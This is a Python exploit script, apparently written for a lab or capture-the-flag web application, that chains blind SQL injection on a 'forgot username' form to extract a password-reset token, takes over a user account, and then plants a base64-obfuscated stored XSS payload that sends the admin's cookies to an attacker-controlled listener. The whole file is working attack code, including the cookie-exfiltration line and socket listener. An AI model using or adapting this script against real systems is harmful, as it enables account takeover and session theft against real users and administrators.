import base64
import socket

import requests
import sys

TARGET_URL = "http://localhost:8000"
VICTIM_USER = "user1"
NEW_PASSWORD = "Password123!"
LHOST = ""  # Change this to your attacker's IP address
LPORT = 8001

def login_bypass():
    print("[*] --- PHASE 1: LOGIN BYPASS ---")
    session = requests.Session()
    
    # 1. Trigger password reset
    print(f"[*] Triggering password reset for {VICTIM_USER}...")
    r = session.post(f"{TARGET_URL}/forgotpassword.php", data={"username": VICTIM_USER})
    if "Email sent!" not in r.text:
        print("[-] Failed to trigger password reset.")
        return

    # 2. Define SQLi Oracle
    def oracle(query):
        r = session.post(
            f"{TARGET_URL}/forgotusername.php",
            data={"username": f"{query};--"}
        )
        return "User exists!" in r.text

    # 3. Find UID
    print("[*] Locating UID...")
    uid = -1
    for i in range(10):
        if oracle(f"{VICTIM_USER}' and uid={i}"):
            uid = i
            break
            
    if uid == -1:
        print("[-] Could not find UID.")
        return
    print(f"[+] Found UID: {uid}")

    # 4. Dump Token
    print("[*] Dumping reset token: ", end="", flush=True)
    token = ""
    for i in range(1, 33):
        low = 48
        high = 122
        while low <= high:
            mid = (low + high) // 2
            
            sqli_greater = f"{VICTIM_USER}' and (select ascii(substring(token,{i},1)) from tokens where uid={uid} order by tid limit 1) > '{mid}'"
            sqli_less = f"{VICTIM_USER}' and (select ascii(substring(token,{i},1)) from tokens where uid={uid} order by tid limit 1) < '{mid}'"
            
            if oracle(sqli_greater):
                low = mid + 1
            elif oracle(sqli_less):
                high = mid - 1
            else:
                token += chr(mid)
                print(chr(mid), end="", flush=True)
                break
    print()

    # 5. Reset the password (FIXED PARAMETERS)
    print(f"[*] Resetting password for {VICTIM_USER}...")
    reset_data = {
        "token": token, 
        "password1": NEW_PASSWORD, 
        "password2": NEW_PASSWORD
    }
    r = session.post(f"{TARGET_URL}/resetpassword.php", data=reset_data)
    
    if "Password changed!" in r.text:
        print("[+] Password reset request sent!")
    else:
        print("[-] Password reset might have failed.")
        return

    # 6. Verify Login Bypass
    print("[*] Verifying login bypass...")
    login_data = {
        "username": VICTIM_USER,
        "password": NEW_PASSWORD
    }
    
    r_login = session.post(f"{TARGET_URL}/login.php", data=login_data, allow_redirects=True)
    
    # Provera preko URL-a umesto teksta, jer je pouzdanija (302 redirect na index.php)
    if r_login.url.endswith("index.php") or "Logout" in r_login.text:
        print(f"[+] SUCCESS: Logged in as {VICTIM_USER}!")
        print("[*] Forward this session data to the Privilege Escalation team:")
        print(f"    Cookies: {session.cookies.get_dict()}")
        return session
    else:
        print("[-] Login verification failed.")
        return None

def privilege_escalation(session):
    print("\n[*] --- PHASE 2: PRIVILEGE ESCALATION (XSS) ---")
    
    b64 = base64.b64encode(f"fetch('http://{LHOST}:{LPORT}/'+btoa(document.cookie))".encode()).decode()
    payload = f"<img src=x onerror='eval(atob(`{b64}`))'/>"
    
    # Using previous session to add payload
    r = session.post(f"{TARGET_URL}/profile.php", data={"description": payload})
    print(f"[*] Set {VICTIM_USER}'s description to XSS payload")
    
    # Waiting for admin bot to visit profile and send cookie
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((LHOST, LPORT))
    s.listen(1)
    print(f"[*] Listening on {LHOST}:{LPORT}...")
    print("[*] Waiting for admin bot to visit profile...")
    
    # Catch the incoming connection from admin bot
    (sock_c, ip_c) = s.accept()
    get_request = sock_c.recv(4096)
    
    try:
        admin_cookie = base64.b64decode(get_request.split(b" ")[1][1:]).decode()
        print(f"[+] Got admin cookie: {admin_cookie}")
        
        # Close sockets
        sock_c.close()
        s.close()
        
        # Return the admin cookie for further use in privilege escalation
        return admin_cookie
    except Exception as e:
        print("[-] Error decoding admin cookie.")
        return None

if __name__ == "__main__":
    session = login_bypass()
    if session:
        admin_cookie = privilege_escalation(session)